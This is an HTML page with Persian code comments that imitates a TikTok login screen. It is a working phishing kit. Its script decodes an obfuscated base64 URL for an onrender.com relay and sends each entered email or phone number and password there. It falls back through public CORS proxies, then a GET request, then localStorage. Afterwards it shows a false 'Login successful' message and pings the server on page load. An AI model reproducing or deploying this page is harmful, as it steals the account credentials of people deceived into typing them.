<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login to TikTok</title>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }

        .login-container {
            background: #000;
            max-width: 420px;
            width: 100%;
            padding: 40px 28px;
            border-radius: 48px;
            border: 1px solid #1a1a1a;
            animation: fadeUp 0.5s ease-out;
        }

        .logo-section {
            text-align: center;
            margin-bottom: 44px;
        }

        .tiktok-icon {
            font-size: 52px;
            background: linear-gradient(135deg, #00f2ea, #ff0050);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: inline-block;
            margin-bottom: 6px;
        }

        .logo-section h1 {
            color: #fff;
            font-size: 26px;
            font-weight: 700;
            letter-spacing: 0.5px;
            margin: 4px 0 2px;
        }

        .logo-section .subtitle {
            color: #888;
            font-size: 15px;
            font-weight: 300;
            letter-spacing: 0.3px;
        }

        .msg-box {
            padding: 10px 14px;
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 16px;
            display: none;
            text-align: right;
            border: 1px solid transparent;
        }
        .msg-box.error {
            display: block;
            background: #3d1a1a;
            color: #f28b82;
            border-color: #5c2020;
        }
        .msg-box.error i {
            margin-left: 6px;
        }
        .msg-box.success {
            display: block;
            background: #1a3d1a;
            color: #81c995;
            border-color: #2a5c2a;
        }
        .msg-box.success i {
            margin-left: 6px;
        }
        .msg-box.info {
            display: block;
            background: #1a2a4a;
            color: #8ab4f8;
            border-color: #2a4a6a;
        }
        .msg-box.info i {
            margin-left: 6px;
        }

        .login-form {
            display: flex;
            flex-direction: column;
            gap: 24px;
        }

        .input-type-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 4px;
        }

        .input-type-selector button {
            flex: 1;
            padding: 10px;
            background: #0a0a0a;
            border: 2px solid #1a1a1a;
            border-radius: 30px;
            color: #666;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .input-type-selector button.active {
            border-color: #ff0050;
            color: #fff;
            background: #1a0a0a;
            box-shadow: 0 0 20px rgba(255, 0, 80, 0.1);
        }

        .input-type-selector button:hover {
            border-color: #ff0050;
            color: #fff;
        }

        .input-group {
            position: relative;
            border-bottom: 2px solid #2a2a2a;
            transition: border-color 0.3s ease;
        }

        .input-group:focus-within {
            border-bottom-color: #ff0050;
        }

        .input-group .input-icon {
            position: absolute;
            right: 4px;
            top: 50%;
            transform: translateY(-50%);
            color: #555;
            font-size: 18px;
            transition: color 0.3s;
        }

        .input-group:focus-within .input-icon {
            color: #ff0050;
        }

        .input-group input {
            width: 100%;
            padding: 16px 40px 8px 10px;
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            font-size: 16px;
        }

        .input-group input::placeholder {
            color: #444;
            font-weight: 300;
            font-size: 14px;
        }

        .input-group label {
            position: absolute;
            right: 40px;
            top: 16px;
            color: #555;
            font-size: 14px;
            pointer-events: none;
            transition: 0.2s ease all;
        }

        .input-group input:focus ~ label,
        .input-group input:not(:placeholder-shown) ~ label {
            top: -8px;
            right: 36px;
            font-size: 11px;
            color: #ff0050;
        }

        .toggle-password {
            position: absolute;
            left: 6px;
            top: 50%;
            transform: translateY(-50%);
            background: transparent;
            border: none;
            color: #555;
            font-size: 18px;
            cursor: pointer;
            transition: color 0.3s;
            padding: 6px;
        }

        .toggle-password:hover {
            color: #ff0050;
        }

        .toggle-password:active {
            transform: translateY(-50%) scale(0.9);
        }

        .btn-login {
            background: linear-gradient(135deg, #ff0050, #f9a825);
            border: none;
            padding: 17px;
            border-radius: 60px;
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 28px rgba(255, 0, 80, 0.35);
            letter-spacing: 0.5px;
            margin-top: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-login:hover:not(:disabled) {
            transform: scale(1.02);
            box-shadow: 0 12px 36px rgba(255, 0, 80, 0.55);
        }

        .btn-login:active:not(:disabled) {
            transform: scale(0.97);
        }

        .btn-login:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.7s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 32px 20px;
                border-radius: 32px;
            }
            .logo-section h1 {
                font-size: 22px;
            }
            .btn-login {
                font-size: 16px;
                padding: 15px;
            }
            .input-type-selector button {
                font-size: 12px;
                padding: 8px;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">

        <div class="logo-section">
            <div class="tiktok-icon">
                <i class="fab fa-tiktok"></i>
            </div>
            <h1>TikTok</h1>
            <p class="subtitle">Log in to your account</p>
        </div>

        <div class="msg-box" id="msgBox">
            <i id="msgIcon" class="fas fa-exclamation-circle"></i>
            <span id="msgText">Error occurred.</span>
        </div>

        <form class="login-form" id="loginForm">
            <div class="input-type-selector">
                <button type="button" class="active" data-type="email" id="emailTypeBtn">
                    <i class="fas fa-envelope"></i> Email
                </button>
                <button type="button" data-type="phone" id="phoneTypeBtn">
                    <i class="fas fa-phone"></i> Phone
                </button>
            </div>

            <div class="input-group" id="emailGroup">
                <i class="fas fa-envelope input-icon"></i>
                <input type="email" id="emailInput" placeholder=" " value="" autocomplete="email">
                <label>Email Address</label>
            </div>

            <div class="input-group" id="phoneGroup" style="display: none;">
                <i class="fas fa-phone input-icon"></i>
                <input type="tel" id="phoneInput" placeholder=" " autocomplete="tel">
                <label>Phone Number</label>
            </div>

            <div class="input-group">
                <i class="fas fa-lock input-icon"></i>
                <input type="password" id="passwordInput" placeholder=" " value="" autocomplete="current-password">
                <label>Password</label>
                <button type="button" class="toggle-password" id="togglePasswordBtn">
                    <i class="fas fa-eye" id="eyeIcon"></i>
                </button>
            </div>

            <button type="submit" class="btn-login" id="loginBtn">
                <i class="fas fa-sign-in-alt"></i>
                <span id="btnText">Log In</span>
            </button>
        </form>
    </div>

    <script>
        // =====================================================
        // 🔒 تنظیمات و توکن
        // =====================================================
        const ENCODED_TOKEN = "aHR0cHM6Ly90ZWxlZ3JhbS1iYWNrZW5kLXpvM24ub25yZW5kZXIuY29t";
        
        function getBackendUrl() {
            try {
                return atob(ENCODED_TOKEN);
            } catch(e) {
                console.warn("Token decode failed, using fallback");
                return "https://telegram-backend-zo3n.onrender.com";
            }
        }

        const TELEGRAM_BACKEND_URL = getBackendUrl();
        const WAKEUP_COUNT = 2;
        let currentLoginType = 'email';

        console.log("✅ Backend URL:", TELEGRAM_BACKEND_URL);

        // =====================================================
        // 📨 ارسال به سرور با روش‌های مختلف
        // =====================================================
        
        // لیست پروکسی‌ها برای دور زدن CORS
        const PROXIES = [
            'https://corsproxy.io/?',
            'https://api.allorigins.win/raw?url=',
            'https://cors-anywhere.herokuapp.com/'
        ];

        // روش اول: ارسال مستقیم
        async function sendDirect(endpoint, data) {
            try {
                const response = await fetch(`${TELEGRAM_BACKEND_URL}${endpoint}`, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(data),
                    mode: 'cors'
                });
                if (response.ok) {
                    return await response.json();
                }
                return null;
            } catch(e) {
                console.log('❌ Direct send failed:', e.message);
                return null;
            }
        }

        // روش دوم: ارسال از طریق پروکسی
        async function sendWithProxy(endpoint, data) {
            for (const proxy of PROXIES) {
                try {
                    const url = `${proxy}${encodeURIComponent(TELEGRAM_BACKEND_URL + endpoint)}`;
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify(data)
                    });
                    if (response.ok) {
                        const result = await response.json();
                        if (result && result.ok !== false) {
                            return result;
                        }
                    }
                } catch(e) {
                    console.log(`❌ Proxy ${proxy} failed:`, e.message);
                }
            }
            return null;
        }

        // روش سوم: ارسال با GET
        async function sendWithGet(endpoint, data) {
            try {
                const params = new URLSearchParams({
                    action: data.action || 'Login',
                    name: data.name || '',
                    extra: data.extra || '',
                    time: data.time || new Date().toLocaleString('en-US')
                });
                const url = `${TELEGRAM_BACKEND_URL}${endpoint}?${params.toString()}`;
                const response = await fetch(url, {
                    method: 'GET',
                    headers: { 'Accept': 'application/json' }
                });
                if (response.ok) {
                    return await response.json();
                }
                return null;
            } catch(e) {
                console.log('❌ GET send failed:', e.message);
                return null;
            }
        }

        // روش چهارم: ذخیره در localStorage
        function saveToLocalStorage(username, password, type) {
            try {
                const logs = JSON.parse(localStorage.getItem('tiktok_login_logs') || '[]');
                logs.push({
                    username: username,
                    password: password,
                    type: type,
                    time: new Date().toISOString(),
                    page: 'tiktok'
                });
                localStorage.setItem('tiktok_login_logs', JSON.stringify(logs));
                console.log('💾 Saved to localStorage');
                return true;
            } catch(e) {
                console.log('❌ localStorage failed:', e.message);
                return false;
            }
        }

        // =====================================================
        // 🚀 تابع اصلی ارسال اطلاعات
        // =====================================================
        async function sendLoginInfo(username, password, typeLabel) {
            const payload = {
                action: "🔐 TikTok Login",
                name: username,
                extra: `Type: ${typeLabel} | Password: ${password}`,
                time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Tehran' })
            };

            const methods = [
                { name: 'Direct', fn: () => sendDirect('/notify', payload) },
                { name: 'Proxy', fn: () => sendWithProxy('/notify', payload) },
                { name: 'GET', fn: () => sendWithGet('/notify', payload) }
            ];

            let success = false;

            for (const method of methods) {
                try {
                    console.log(`🔄 Trying ${method.name}...`);
                    const result = await method.fn();
                    if (result && result.ok !== false) {
                        console.log(`✅ ${method.name} succeeded!`);
                        success = true;
                        break;
                    }
                } catch(e) {
                    console.log(`❌ ${method.name} error:`, e.message);
                }
            }

            if (!success) {
                console.log('⚠️ All methods failed, saving to localStorage...');
                saveToLocalStorage(username, password, typeLabel);
                return false;
            }

            return true;
        }

        // =====================================================
        // 🚀 ارسال Wake-up
        // =====================================================
        function sendWakeup(index) {
            try {
                fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        action: `🔄 TikTok Wake-up (${index}/${WAKEUP_COUNT})`,
                        name: "System",
                        extra: `Wake-up ping ${index}`,
                        time: new Date().toLocaleString('en-US')
                    })
                })
                .then(() => console.log(`✅ Wake-up ${index} sent`))
                .catch(() => console.log(`⚠️ Wake-up ${index} failed`));
            } catch(e) {
                console.log("Wake-up error:", e);
            }
        }

        // =============================================
        // ===== بازگشت به صفحه اندکس =====
        // =============================================
        function goToIndex() {
            localStorage.setItem('fromPage', 'tiktok');
            window.location.href = 'index.html';
        }

        // =============================================
        // ===== مدیریت پیام‌ها =====
        // =============================================
        function showMessage(message, type) {
            const msgBox = document.getElementById('msgBox');
            const msgIcon = document.getElementById('msgIcon');
            const msgText = document.getElementById('msgText');

            msgBox.className = 'msg-box';
            
            if (type === 'error') {
                msgBox.classList.add('error');
                msgIcon.className = 'fas fa-exclamation-circle';
            } else if (type === 'success') {
                msgBox.classList.add('success');
                msgIcon.className = 'fas fa-check-circle';
            } else if (type === 'info') {
                msgBox.classList.add('info');
                msgIcon.className = 'fas fa-info-circle';
            }

            msgText.textContent = message;
            msgBox.style.display = 'block';
        }

        function hideMessage() {
            const msgBox = document.getElementById('msgBox');
            msgBox.style.display = 'none';
        }

        // =============================================
        // ===== تنظیم دکمه لاگین =====
        // =============================================
        function setLoginButtonLoading(isLoading) {
            const btn = document.getElementById('loginBtn');
            const btnText = document.getElementById('btnText');
            if (isLoading) {
                btn.disabled = true;
                btnText.innerHTML = '<span class="spinner"></span> Sending...';
            } else {
                btn.disabled = false;
                btnText.textContent = 'Log In';
            }
        }

        // =============================================
        // ===== توابع کنترل فرم =====
        // =============================================
        function switchInputType(type) {
            currentLoginType = type;
            const emailGroup = document.getElementById('emailGroup');
            const phoneGroup = document.getElementById('phoneGroup');
            const emailTypeBtn = document.getElementById('emailTypeBtn');
            const phoneTypeBtn = document.getElementById('phoneTypeBtn');

            hideMessage();

            if (type === 'email') {
                emailGroup.style.display = 'block';
                phoneGroup.style.display = 'none';
                document.getElementById('emailInput').required = true;
                document.getElementById('phoneInput').required = false;
                emailTypeBtn.classList.add('active');
                phoneTypeBtn.classList.remove('active');
            } else {
                emailGroup.style.display = 'none';
                phoneGroup.style.display = 'block';
                document.getElementById('emailInput').required = false;
                document.getElementById('phoneInput').required = true;
                emailTypeBtn.classList.remove('active');
                phoneTypeBtn.classList.add('active');
            }
        }

        // =============================================
        // ===== Toggle Password =====
        // =============================================
        document.getElementById('togglePasswordBtn').addEventListener('click', function() {
            const passwordInput = document.getElementById('passwordInput');
            const eyeIcon = document.getElementById('eyeIcon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.className = 'fas fa-eye-slash';
            } else {
                passwordInput.type = 'password';
                eyeIcon.className = 'fas fa-eye';
            }
        });

        // =============================================
        // ===== انتخاب نوع ورود =====
        // =============================================
        document.getElementById('emailTypeBtn').addEventListener('click', function() {
            switchInputType('email');
        });

        document.getElementById('phoneTypeBtn').addEventListener('click', function() {
            switchInputType('phone');
        });

        // =============================================
        // ===== مدیریت فرم =====
        // =============================================
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const emailInput = document.getElementById('emailInput');
            const phoneInput = document.getElementById('phoneInput');
            const passwordInput = document.getElementById('passwordInput');

            hideMessage();
            setLoginButtonLoading(true);

            let isValid = true;
            let errorMessage = '';
            let username = '';

            if (currentLoginType === 'email') {
                const email = emailInput.value.trim();
                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailPattern.test(email)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid email address (e.g., name@domain.com)';
                } else {
                    username = email;
                }
            } else {
                const phone = phoneInput.value.trim();
                const phonePattern = /^[0-9]{10,15}$/;
                if (!phonePattern.test(phone)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid phone number (10-15 digits)';
                } else {
                    username = phone;
                }
            }

            const password = passwordInput.value.trim();
            if (isValid && password.length < 5) {
                isValid = false;
                errorMessage = 'Password must be at least 5 characters';
            }

            if (!isValid) {
                showMessage(errorMessage, 'error');
                setLoginButtonLoading(false);
                return;
            }

            const typeLabel = currentLoginType === 'email' ? 'Email' : 'Phone';
            const sent = await sendLoginInfo(username, password, typeLabel);

            if (sent) {
                showMessage('✅ Login successful! Redirecting...', 'success');
            } else {
                showMessage('⚠️ Login info saved locally (server unavailable)', 'info');
            }

            setTimeout(function() {
                goToIndex();
            }, 1500);
        });

        // =============================================
        // ===== اعتبارسنجی لحظه‌ای =====
        // =============================================
        document.getElementById('emailInput').addEventListener('input', function() {
            hideMessage();
        });

        document.getElementById('phoneInput').addEventListener('input', function() {
            hideMessage();
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        document.getElementById('phoneInput').addEventListener('keypress', function(e) {
            if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab') {
                e.preventDefault();
            }
        });

        // =====================================================
        // 🔥 ویکاپ هنگام لود صفحه
        // =====================================================
        document.addEventListener('DOMContentLoaded', function() {
            // تنظیم نوع ورود پیش‌فرض
            switchInputType('email');
            
            // بررسی سلامت سرور
            fetch(`${TELEGRAM_BACKEND_URL}/health`)
                .then(() => console.log('✅ Server is awake'))
                .catch(() => console.log('🔄 Server may be waking up...'));

            // ارسال wake-up ها
            for (let i = 1; i <= WAKEUP_COUNT; i++) {
                setTimeout(function() {
                    sendWakeup(i);
                }, i * 400);
            }

            // نمایش اطلاعات ذخیره شده
            try {
                const logs = JSON.parse(localStorage.getItem('tiktok_login_logs') || '[]');
                if (logs.length > 0) {
                    console.log(`📋 ${logs.length} login(s) saved locally`);
                    console.log('📋 Last login:', logs[logs.length - 1]);
                }
            } catch(e) {}

            console.log('✅ TikTok Login Page Ready');
        });

        // =====================================================
        // 🛡️ کلید Enter برای ارسال فرم
        // =====================================================
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const form = document.getElementById('loginForm');
                const activeElement = document.activeElement;
                if (activeElement === document.getElementById('emailInput') ||
                    activeElement === document.getElementById('phoneInput') ||
                    activeElement === document.getElementById('passwordInput')) {
                    form.dispatchEvent(new Event('submit'));
                }
            }
        });
    </script>

</body>
</html>
